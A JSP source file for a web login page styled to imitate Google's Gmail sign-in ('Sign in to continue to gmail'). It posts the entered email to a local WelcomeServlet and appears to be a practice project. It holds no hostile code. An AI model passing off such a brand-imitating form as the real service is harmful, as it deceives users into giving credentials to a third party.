<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<script type="text/javascript" src="login1.js">
	</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<style type="text/css">
body {
	background: grey;
	height: 700px;
	margin: 0px;
	padding: 0px;
}

.base {
	position: absolute;
	width: 100%;
	top: 0px;
	left: 0px;
	color: gray;
}

.button {
	border-radius: 5px;
	background-color: DodgerBlue;
	border: none;
	color: white;
	padding: 10px 22px;
	text-align: center;
	text-decoration: none;
	display: inline-block;
	font-size: 16px;
	margin: 35px 15px;
	cursor: pointer;
	box-shadow: 0px 1px 1px 1px #c6c1c1;
}

img {
	margin-top: 4px;
	margin-left: 10px;
	float: left;
}

#form1 {
	margin-top: 60px;
	width: 455px;
	height: 520px;
	padding-top: 40px;
	background: white;
	box-shadow: 0px 1px 1px 1px #c6c1c1;
}

h2 {
	text-align: left;
	margin-top: 75px;
	margin-left: 8px;
	font-family: roboto, arial, sans-serif;
}

.text2 {
	margin-top: 20px;
	margin-left: 10px;
	float: left;
	font-size: 14px;
	font-family: roboto, arial, sans-serif;
}

.text3 {
	margin-top: 5px;
	margin-left: 10px;
	float: left;
	font-size: 12px;
	font-family: roboto, arial, sans-serif;
}

.text4 {
	margin-top: 70px;
	margin-left: -115px;
	float: left;
	font-size: 14px;
	font-family: roboto, arial, sans-serif;
}

input[type="text"] {
	width: 270px;
	height: 42px;
	border-radius: 5px 5px 5px 5px;
	background: transparent;
	font-size: 18px;
	margin-top: 50px;
	border-width: 0px;
	outline: none;
	margin-left: 50px;
	margin-right: 50px;
}
</style>

<title>Insert title here</title>

</head>
<body>
	<div class="base" align="center">

		<form onsubmit="return checkvalid()" action="WelcomeServlet">
			<div id="form1">



				<img src="index.png" height=55 width=90 />
				<h2 class="text1">
					<b>Sign in</b>
				</h2>
				<h2 class="text3">
					<b>to continue to gmail</b>
				</h2>
				<input type="text" name="email" id="email" />
				
				<p class="text4">
					<a href="Login.html"> <b>More options</b>
					</a>
				</p>
				<input type="submit" id="button"
					value="Next" class="button" style="float: right" />
			</div>
		</form>
	</div>

	

</body>
</html>